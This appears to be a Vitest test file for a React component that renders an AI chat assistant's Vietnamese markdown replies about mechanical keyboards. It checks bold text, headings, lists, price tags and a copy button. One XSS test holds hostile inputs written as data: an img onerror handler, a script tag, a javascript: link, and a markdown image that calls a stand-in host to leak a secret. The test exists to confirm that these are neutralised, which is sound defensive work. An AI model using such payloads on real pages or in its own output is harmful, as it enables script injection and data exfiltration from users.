import React from 'react';
import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor, cleanup } from '@testing-library/react';
import { MarkdownMessage, splitPrices } from './MarkdownMessage';

const SAMPLE = `Đây là gợi ý cho bạn:

### 10. Bridge75 — Tầm trung
- **Vỏ nhôm CNC** gõ chắc tay
- *Đặc điểm:* gasket mount êm
- Giá tham khảo: **850.000 VNĐ**

1. Gateron Oil King
2. Akko Cream Yellow`;

describe('MarkdownMessage', () => {
  afterEach(() => {
    cleanup();
    vi.restoreAllMocks();
  });

  it('không còn dấu ** hay * thô trong chữ hiển thị', () => {
    const { container } = render(<MarkdownMessage content={SAMPLE} />);
    expect(container.textContent).not.toContain('**');
    expect(container.textContent).not.toMatch(/\*Đặc điểm/);
  });

  it('**in đậm** thành <strong> với style sáng nổi bật', () => {
    const { container } = render(<MarkdownMessage content={SAMPLE} />);
    const strong = Array.from(container.querySelectorAll('strong')).find((el) => el.textContent === 'Vỏ nhôm CNC');
    expect(strong).toBeDefined();
    expect(strong?.className).toContain('font-semibold');
    expect(strong?.className).toContain('text-zinc-100');
  });

  it('giá tiền hiện thành thẻ pill màu hổ phách (kể cả khi AI lỡ bọc **)', () => {
    const { container } = render(<MarkdownMessage content={SAMPLE} />);
    const tags = container.querySelectorAll('[data-price-tag]');
    expect(tags).toHaveLength(1);
    expect(tags[0].textContent).toBe('850.000 VNĐ');
    expect(tags[0].className).toContain('text-amber-300');
  });

  it('tiêu đề ### và danh sách được dựng thành thẻ thật', () => {
    const { container } = render(<MarkdownMessage content={SAMPLE} />);
    expect(container.querySelector('h4')?.textContent).toBe('10. Bridge75 — Tầm trung');
    expect(container.querySelectorAll('ul > li')).toHaveLength(3);
    expect(container.querySelectorAll('ol > li')).toHaveLength(2);
  });

  it('nhận diện nhiều kiểu giá, không nhận nhầm số thường', () => {
    const tagged = (text: string) =>
      splitPrices(text).filter((p) => typeof p !== 'string').length;
    expect(tagged('Giá 1.200.000 – 1.500.000 VNĐ nhé')).toBe(1);
    expect(tagged('Khoảng 2,5 triệu hoặc $129 hoặc 99 USD')).toBe(3);
    expect(tagged('Có 104 phím, 5 trong số đó, 1.000 điểm')).toBe(0);
  });

  it('chống XSS: HTML thô bị bỏ, link javascript: bị vô hiệu, ảnh không được tải', () => {
    const { container } = render(
      <MarkdownMessage
        content={
          'Xin chào <img src=x onerror="alert(1)"> <script>alert(2)</script>\n\n' +
          '[bấm vào đây](javascript:alert(3))\n\n' +
          '![exfil](https://evil.example/leak?d=secret)'
        }
      />
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('onerror');
    const link = container.querySelector('a');
    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:');
    expect(container.textContent).toContain('[Ảnh: exfil]');
  });

  it('link ngoài mở tab mới với rel an toàn', () => {
    const { container } = render(<MarkdownMessage content="[KeyCraft](https://example.com)" />);
    const link = container.querySelector('a');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toContain('noopener');
  });

  it('khối code có nút sao chép nội dung', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });

    render(<MarkdownMessage content={'```\nGateron Oil King: 55gf\n```'} />);
    fireEvent.click(screen.getByRole('button', { name: 'Sao chép đoạn mã' }));

    await waitFor(() => expect(writeText).toHaveBeenCalledWith('Gateron Oil King: 55gf\n'));
    expect(await screen.findByRole('button', { name: 'Đã sao chép' })).toBeDefined();
  });
});
